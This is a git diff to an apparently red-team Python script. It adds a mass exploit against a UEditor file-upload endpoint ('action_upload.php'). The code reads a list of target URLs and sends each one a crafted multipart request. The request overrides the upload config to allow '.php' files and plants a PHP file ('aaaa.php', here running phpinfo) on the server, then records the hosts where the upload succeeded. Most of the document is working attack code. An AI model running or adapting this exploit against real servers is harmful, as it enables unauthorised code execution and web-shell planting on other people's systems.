@@ -54,3 +54,71 @@ if url_200:
     with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\tdxk_sucess_200.txt','w') as f:
         for result in url_200:
             f.write(result + '\n')
+
+# 執行 PoC，請求 200 的 URL 輸入成 result-tdxk-sucess_200.txt
+
+def exp(line) :
+    host = line + "/module/ueditor/php/action_upload.php?action=uploadfile"
+    try:
+        response = requests.post(url=host, headers=headers, data=data,timeout=15)
+        if response.status_code == 200:
+            print(f"POST request successful for IP: {line}")
+            with pool:
+                with open('result-tdxk-sucess_200.txt','a') as f:
+                    f.write(line + '/aaaa.php\n')
+                    print(f"成功上傳 : {line}/aaaa.php")
+                    print('OK')
+        else:
+            print(f"上傳失敗 {line}")
+    except Exception as e:
+        pass
+        print("error: ",e)
+
+# Payload data
+
+data = """
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+ffff
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+1000000000
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+aaaa
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+.php
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="ffff"; filename="test.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+-----------------------------55719851240137822763221368724
+Content-Disposition: form-data; name="mufile"
+
+submit
+-----------------------------55719851240137822763221368724--
+"""
+
+# Payload header
+
+headers = {
+    'User-Agent': 'Go-http-client/1.1',
+    'Content-Length': '893',
+    'Content-Type': 'multipart/form-data; boundary=---------------------------55719851240137822763221368724',
+    'X_requested_with': 'XMLHttpRequest',
+    'Accept-Encoding': 'gzip'
+}
+
+# 打開狀態碼 200 URL
+
+with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\tdxk_sucess_200.txt','r') as f:
+    urls = f.readlines()
+    for url_200_test in urls:
+        line = url_200_test.strip()
+        exp(line)
